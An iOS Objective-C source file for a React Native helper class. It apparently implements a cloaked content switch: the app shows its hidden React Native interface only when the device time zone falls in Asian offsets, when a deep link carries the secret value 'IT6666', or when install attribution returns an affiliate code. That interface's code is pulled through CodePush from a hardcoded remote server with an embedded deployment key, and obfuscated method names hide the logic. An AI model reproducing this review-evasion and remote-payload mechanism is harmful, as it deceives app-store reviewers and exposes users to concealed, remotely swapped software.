#import "RNPOneMOneHelper.h"

#import <CodePush/CodePush.h>
#import <UserNotifications/UNUserNotificationCenter.h>
#import <react-native-orientation-locker/Orientation.h>

#import <RNUrbanHappy/RNUMConfigure.h>
#import "RNCPushNotificationIOS.h"

#import <UMCommon/MobClick.h>
#import <UMCommon/UMConfigure.h>
#import <UMPush/UMessage.h>
#import <UMCommon/UMCommon.h>
#import <TInstallSDK/TInstallSDK.h>

#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>
#import <react/config/ReactNativeConfig.h>


@interface RNPOneMOneHelper () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif


@implementation RNPOneMOneHelper

static NSString * const poneMOne_APP = @"poneMOne_FLAG_APP";
static NSString * const poneMOne_affCode = @"affCode";
static NSString * const poneMOne_raf = @"raf";

static NSString * const poneMOne_appVersion = @"1.0.3";
static NSString * const poneMOne_deploymentKey = @"zuwA6IQKCJxiupPT9MfNKnq0guWT4ksvOXqog";
static NSString * const poneMOne_serverUrl = @"https://ltt985.com";

static NSString * const poneMOne_tInstall = @"2O5LGA";
static NSString * const poneMOne_tInstallHost = @"https://feaffcodegetm2.com";

static NSString * const poneMOne_uMengAppKey = @"63d920c81e29db7b428acff0";
static NSString * const poneMOne_uMengAppChannel = @"App Store";

static RNPOneMOneHelper *instance = nil;

+ (instancetype)poneMOne_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}

- (void)poneMOne_dayYouWentAwayWithOptions:(NSDictionary *)launchOptions {
  [RNUMConfigure initWithAppkey:poneMOne_uMengAppKey channel:poneMOne_uMengAppChannel];
  UMessageRegisterEntity *entity = [[UMessageRegisterEntity alloc] init];
  entity.types = UMessageAuthorizationOptionBadge|UMessageAuthorizationOptionAlert;
  [UNUserNotificationCenter currentNotificationCenter].delegate=self;
  [UMessage registerForRemoteNotificationsWithLaunchOptions:launchOptions Entity:entity completionHandler:^(BOOL granted, NSError * _Nullable error) {
    if (granted) {
    } else {
    }
  }];
}

- (UIInterfaceOrientationMask)poneMOne_getOrientation {
  return [Orientation getOrientation];
}

- (BOOL)poneMOne_dailyInAsian {
    NSInteger poneMOne_Offset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
    if (poneMOne_Offset >= 3 && poneMOne_Offset <= 11) {
        return YES;
    } else {
        return NO;
    }
}

- (NSDictionary *)poneMOne_dictFromQueryString:(NSString *)queryString {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    NSArray *pairs = [queryString componentsSeparatedByString:@"&"];
    for (NSString *pair in pairs) {
        NSArray *elements = [pair componentsSeparatedByString:@"="];
        if ([elements count] > 1) {
            NSString *key = [elements objectAtIndex:0];
            NSString *val = [elements objectAtIndex:1];
            [dict setObject:val forKey:key];
        }
    }
    return dict;
}

- (BOOL)poneMOne_tryOtherWayQueryScheme:(NSURL *)url {
    if ([[url scheme] containsString:@"myapp"]) {
        NSDictionary *queryParams = [self poneMOne_dictFromQueryString:[url query]];
        
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        [ud setObject:queryParams forKey:@"queryParams"];
        
        NSString *paramValue = queryParams[@"paramName"];
        if ([paramValue isEqualToString:@"IT6666"]) {
            [ud setObject:poneMOne_appVersion forKey:@"appVersion"];
            [ud setObject:poneMOne_deploymentKey forKey:@"deploymentKey"];
            [ud setObject:poneMOne_serverUrl forKey:@"serverUrl"];
            [ud setBool:YES forKey:poneMOne_APP];
            [ud synchronize];
            return YES;
        }
    }
    return NO;
}


- (BOOL)poneMOne_tryThisWay:(void (^)(void))changeVcBlock {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if (![self poneMOne_dailyInAsian]) {
        return NO;
    }
    if ([ud boolForKey:poneMOne_APP]) {
        return YES;
    } else {
        [self poneMOne_judgeIfNeedChangeRootController:changeVcBlock];
        return NO;
    }
}

- (void)poneMOne_judgeIfNeedChangeRootController:(void (^)(void))changeVcBlock {
  [TInstall initInstall:poneMOne_tInstall setHost:poneMOne_tInstallHost];
  [TInstall getWithInstallResult:^(NSDictionary * _Nullable data) {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    NSString * _Nullable affCode = [data valueForKey:@"affCode"];

    NSString * _Nullable raf = [data valueForKey:@"raf"];
    [ud setObject:raf forKey:poneMOne_raf];

    if (affCode.length == 0) {
      affCode = [data valueForKey:@"affcode"];
      if (affCode.length == 0) {
        affCode = [data valueForKey:@"aff"];
      }
    }
    
    
    if (affCode.length != 0) {
      [ud setObject:affCode forKey:poneMOne_affCode];
      [ud setObject:poneMOne_appVersion forKey:@"appVersion"];
      [ud setObject:poneMOne_deploymentKey forKey:@"deploymentKey"];
      [ud setObject:poneMOne_serverUrl forKey:@"serverUrl"];
      [ud setBool:YES forKey:poneMOne_APP];
      [ud synchronize];
      changeVcBlock();
    }
  }];
}

- (UIViewController *)poneMOne_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self poneMOne_dayYouWentAwayWithOptions:launchOptions];
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"FedevProject", nil);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [UIViewController new];
  rootViewController.view = rootView;
  return rootViewController;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  NSDictionary * userInfo = response.notification.request.content.userInfo;
  if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  NSDictionary * userInfo = notification.request.content.userInfo;
  if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage setAutoAlert:NO];
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
